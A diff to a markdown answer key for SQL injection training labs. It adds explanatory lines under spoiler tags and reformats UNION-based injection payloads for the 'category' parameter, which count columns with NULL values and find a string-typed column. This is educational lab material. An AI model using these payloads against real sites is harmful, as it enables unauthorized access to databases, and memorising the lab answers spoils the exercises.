@@ -8,7 +8,9 @@ Do not read unless explicitly looking for exact answers
 <details> 
   <summary> <b> ANSWER SPOILER ALERT </b> </summary>
       
-      category=' UNION SELECT NULL,NULL,NULL--
+  Identify number of columns by appending NULL to UNION SELECT string:  
+
+    category=' UNION SELECT NULL,NULL,NULL--
   
 </details>
 
@@ -19,11 +21,11 @@ Do not read unless explicitly looking for exact answers
  
  Identify number of columns by appending NULL to UNION SELECT string:  
   
-     category=' UNION SELECT NULL,NULL,NULL--
+    category=' UNION SELECT NULL,NULL,NULL--
       
  Replace NULL with string to identify column:
   
-     category=' UNION SELECT NULL,'[STRING]',NULL--
+    category=' UNION SELECT NULL,'[STRING]',NULL--
       
 </details>
 
@@ -32,6 +34,8 @@ Do not read unless explicitly looking for exact answers
 <details> 
   <summary> <b> ANSWER SPOILER ALERT </b> </summary>
    
-     category=
+  Verify number of colums with the NULL payload:
+  
+    category=' UNION SELECT NULL,NULL--
 
 </details>
